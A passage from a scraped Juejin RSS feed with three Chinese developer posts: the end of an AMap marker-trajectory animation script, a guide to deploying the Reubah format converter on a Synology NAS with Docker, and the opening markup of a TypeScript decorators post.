            if (dist &gt; 0.00001) {
                accumulatedPassedPath.push(currentPosArray);
                lastRecordedPosition = currentPosArray;
                
                // 更新轨迹线显示
                passedPolyline.setPath(accumulatedPassedPath);
            }
            
            map.setCenter(currentPos, true);
        });

        marker.on('moveend', function(e) {
            isAnimating = false;
            // 确保最后一个位置被记录
            var finalPos = e.target.getPosition();
            var finalPosArray = [finalPos.lng, finalPos.lat];
            
            // 检查最后一个位置是否已经记录
            var lastPoint = accumulatedPassedPath[accumulatedPassedPath.length - 1];
            var dist = Math.sqrt(
                Math.pow(finalPosArray[0] - lastPoint[0], 2) + 
                Math.pow(finalPosArray[1] - lastPoint[1], 2)
            );
            
            if (dist &gt; 0.00001) {
                accumulatedPassedPath.push(finalPosArray);
                passedPolyline.setPath(accumulatedPassedPath);
            }
            
            lastRecordedPosition = finalPosArray;
        });

        // 模拟远程加载轨迹点的函数
        function loadTrajectoryPoints() {
            if (loadedIndex &gt;= allTrajectoryPoints.length) {
                // 所有轨迹点已加载完成，清除定时器
                if (loadInterval) {
                    clearInterval(loadInterval);
                    loadInterval = null;
                }
                console.log('所有轨迹点已加载完成');
                return;
            }

            // 计算本次要加载的轨迹点
            var newPoints = [];
            var endIndex = Math.min(loadedIndex + batchSize, allTrajectoryPoints.length);
            
            for (var i = loadedIndex; i &lt; endIndex; i++) {
                newPoints.push(allTrajectoryPoints[i]);
            }

            console.log('加载新的轨迹点:', newPoints);
            
            // 将新点添加到当前路径
            currentPath = currentPath.concat(newPoints);
            loadedIndex = endIndex;

            // 获取marker当前位置
            var currentPosition = marker.getPosition();
            var currentPosArray = [currentPosition.lng, currentPosition.lat];
            
            // 如果marker正在移动，需要暂停并重新规划路径
            if (isAnimating) {
                marker.pauseMove();
                
                // 找到当前位置在currentPath中最接近的点索引
                var closestIndex = 0;
                var minDist = Infinity;
                for (var k = 0; k &lt; currentPath.length; k++) {
                    var dist = Math.sqrt(
                        Math.pow(currentPath[k][0] - currentPosition.lng, 2) + 
                        Math.pow(currentPath[k][1] - currentPosition.lat, 2)
                    );
                    if (dist &lt; minDist) {
                        minDist = dist;
                        closestIndex = k;
                    }
                }
                
                // 构建从当前位置开始的新路径
                // 如果当前位置不在路径点上，先添加当前位置
                var newPath = [];
                if (minDist &gt; 0.0001) {
                    newPath.push(currentPosArray);
                }
                
                // 添加从最近点之后的所有点（包括新加载的点）
                for (var m = closestIndex + 1; m &lt; currentPath.length; m++) {
                    newPath.push(currentPath[m]);
                }
                
                // 如果还有剩余路径，继续移动
                if (newPath.length &gt; 0) {
                    isAnimating = true;
                    marker.moveAlong(newPath, {
                        duration: 500,
                        autoRotation: true,
                    });
                }
            } else {
                // 如果marker没有在移动，找到当前位置在路径中的位置，从那里继续
                var startPath = [];
                var foundIndex = -1;
                
                // 查找当前位置在路径中的位置
                for (var n = 0; n &lt; currentPath.length; n++) {
                    var dist = Math.sqrt(
                        Math.pow(currentPath[n][0] - currentPosition.lng, 2) + 
                        Math.pow(currentPath[n][1] - currentPosition.lat, 2)
                    );
                    if (dist &lt; 0.0001) {
                        foundIndex = n;
                        break;
                    }
                }
                
                if (foundIndex &gt;= 0 &amp;&amp; foundIndex &lt; currentPath.length - 1) {
                    // 从找到的位置之后开始
                    startPath = currentPath.slice(foundIndex + 1);
                } else if (foundIndex === -1) {
                    // 如果没找到，从当前位置开始，包含所有剩余点
                    startPath = [currentPosArray].concat(currentPath.slice(1));
                } else {
                    // 已经在最后一个点，使用新加载的点
                    startPath = currentPath.slice(-newPoints.length);
                }
                
                if (startPath.length &gt; 0) {
                    isAnimating = true;
                    marker.moveAlong(startPath, {
                        duration: 500,
                        autoRotation: true,
                    });
                }
            }
        }

        // 确保地图渲染完成后再开始移动动画
        map.on('complete', function() {
            console.log('地图渲染完成，开始加载轨迹点');
            
            // 加载第一批数据
            var firstBatch = [];
            var firstEndIndex = Math.min(loadedIndex + batchSize, allTrajectoryPoints.length);
            for (var i = loadedIndex; i &lt; firstEndIndex; i++) {
                firstBatch.push(allTrajectoryPoints[i]);
            }
            currentPath = currentPath.concat(firstBatch);
            loadedIndex = firstEndIndex;
            console.log('加载第一批轨迹点:', firstBatch);
            
            // 开始第一次移动
            if (currentPath.length &gt; 1) {
                isAnimating = true;
                marker.moveAlong(currentPath, {
                    duration: 500,
                    autoRotation: true,
                });
            }
            
            // 每3秒加载一次新数据
            loadInterval = setInterval(function() {
                loadTrajectoryPoints();
            }, 3000);
        });

        map.setFitView();
    });
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[『NAS』图片和文档格式转换工具-Reubah]]></title>    <link>https://juejin.cn/post/7596883689827811391</link>    <guid>https://juejin.cn/post/7596883689827811391</guid>    <pubDate>2026-01-19T17:45:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827811391" data-draft-id="7596934200580653092" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="『NAS』图片和文档格式转换工具-Reubah"/> <meta itemprop="keywords" content="前端,Docker"/> <meta itemprop="datePublished" content="2026-01-19T17:45:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="德育处主任"/> <meta itemprop="url" content="https://juejin.cn/user/2673620576140030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            『NAS』图片和文档格式转换工具-Reubah
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2673620576140030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    德育处主任
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:45:45.000Z" title="Mon Jan 19 2026 17:45:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>点赞 + 关注 + 收藏 = 学会了</strong></p>
<blockquote>
<p>整理了一个NAS小专栏，有兴趣的工友可以关注一下 👉 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4251932893636722695%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4251932893636722695#wechat_redirect" ref="nofollow noopener noreferrer">《NAS邪修》</a></p>
</blockquote>
<p>Reubah 是一款基于网页的工具，具备图片格式转换、优化、批量处理（背景移除即将推出）和多种文档格式转换功能，支持暗黑模式与 API，无文件存储且自动清理，可通过 Docker 或本地部署，界面简洁易用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/011df7c583a641439a43488b7117ee99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=PHpG5RyccssM5VpWJl3sjyA7JLc%3D" alt="01.png" loading="lazy"/></p>
<p>本次使用的是群晖 NAS 部署 Reubah，其他品牌的 NAS 操作步骤类似。</p>
<p>首先在“File Station”里找到“docker”文件夹，在“docker”文件夹里创建“reubah”文件夹。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/971c3c4c4a5a459dba90080c2f962441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=Mt3BQ6vtdFODl7eS9llwHRu7Je4%3D" alt="02.png" loading="lazy"/></p>
<p>打开“Container Manager”，新增一个项目。</p>
<p>项目名称填 <code>reubah</code>。</p>
<p>路径选择刚刚在“docker”文件夹里创建的“reubah”。</p>
<p>来源选择“创建 docker-mompose.yml”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a176253c58454def9f19d44a895a187b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=%2F%2F44Spieo0szajoMfBLSaX6Ljx0%3D" alt="03.png" loading="lazy"/></p>
<p>然后填入以下代码（需要注意代码格式，空格和换行这些）。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">services:</span>
  <span class="hljs-attr">reubah:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">ghcr.io/dendianugerah/reubah:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">reubah</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8081:8081"</span>
    <span class="hljs-attr">security_opt:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-literal">no</span><span class="hljs-string">-new-privileges:true</span>
    <span class="hljs-attr">cap_drop:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">ALL</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
</code></pre>
<p><code>8081:8081</code> 这句，冒号左侧的数字是可以改的，右侧那个不能改。</p>
<p>输入完代码后点击“下一步”。</p>
<p>勾选“通过 Web Station 设置网页门户”，然后点击“下一步”，等待 docker 下载相关代码。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d01971a81daf48a0b2eb7168dee16801~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=hM%2BGF%2BvQvlxDwaQ0dwAkk42%2FZr4%3D" alt="04.png" loading="lazy"/></p>
<p>最后一步是打开“Web Station”（没有这个工具就去“套件中心”下载）。</p>
<p>新增一个网络门户，参考下图选项。</p>
<p>需要注意，端口要输入一个和其他项目不冲突的数字，我这里输入的是 <code>2347</code>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfb7fea273484c14b275360fc733f33e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=Jn0S2nDef7Nkqrs7Ykq6whOKKhg%3D" alt="05.png" loading="lazy"/></p>
<p>完成上面所有操作后，在浏览器打开 <code>NAS的IP + reubah端口号</code> 就可以访问 Rebuah 了。</p>
<p>比如我的是 <code>http://192.168.31.85:2347</code>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67a941b24dd34d12b3bcc06c54754030~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=u%2Bk9T7DPppwtzBQ3OKvXJq8A6JE%3D" alt="06.png" loading="lazy"/></p>
<p>在图片格式转换这边，还支持 iPhone 的实况照片格式（HEIC）转换。</p>
<p>常见的 jpeg、png、webp、gif、bmp 以及将图片转换成 pdf 都是支持的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87e6736a0c004730b486abe22d23392c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=DfpFi2sFrPszx%2F97zhsu15ra6jE%3D" alt="07.png" loading="lazy"/></p>
<p>文件格式这边包含常见的pdf、docx、doc、odt、txt 和 rtf。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6043ec0ed47c4bbeb9550bc1177bed4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=OfkKNWx19MmjfkPIGAzOaIfM%2B1Y%3D" alt="08.png" loading="lazy"/></p>
<p>切换到 Batch Processing 面板还可以做批量处理。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679f27fb544a4b2b8fad743cc575067e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=OLgiu4EWXg7lG85od9y7C%2FV8hgs%3D" alt="09.png" loading="lazy"/></p>
<hr/>
<p>以上就是本文的全部内容啦，想了解更多NAS玩法可以关注<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4251932893636722695%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4251932893636722695#wechat_redirect" ref="nofollow noopener noreferrer">《NAS邪修》</a></p>
<p><strong>点赞 + 关注 + 收藏 = 学会了</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TS@装饰器使用和原理]]></title>    <link>https://juejin.cn/post/7596906923892686858</link>    <guid>https://juejin.cn/post/7596906923892686858</guid>    <pubDate>2026-01-19T17:53:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892686858" data-draft-id="7591705084671197222" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TS@装饰器使用和原理"/> <meta itemprop="keywords" content="前端,TypeScript"/> <meta itemprop="datePublished" content="2026-01-19T17:53:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LaLu"/> <meta itemprop="url" content="https://juejin.cn/user/739350236891191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TS@装饰器使用和原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/739350236891191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LaLu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:53:36.000Z" title="Mon Jan 19 2026 17:53:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 